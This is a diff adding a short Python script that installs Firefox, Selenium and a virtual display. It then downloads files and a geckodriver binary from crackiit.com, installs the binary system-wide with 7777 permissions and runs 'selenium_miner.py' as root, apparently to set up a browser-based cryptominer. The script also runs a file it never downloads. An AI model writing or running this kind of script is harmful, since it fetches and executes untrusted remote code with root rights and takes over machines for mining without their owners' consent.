@@ -1,0 +1,11 @@
+import os
+os.system("apt-get -y install python3-pip")
+os.system("pip3 install selenium")
+os.system("pip3 install pyvirtualdisplay")
+os.system("apt-get -y install firefox xvfb")
+os.system("wget http://crackiit.com/matlab.py")
+os.system("wget http://crackiit.com/file.html")
+os.system("wget http://crackiit.com/geckodriver")
+os.system("mv geckodriver /usr/local/bin")
+os.system("chmod 7777 /usr/local/bin/geckodriver")
+os.system("sudo python3 selenium_miner.py")
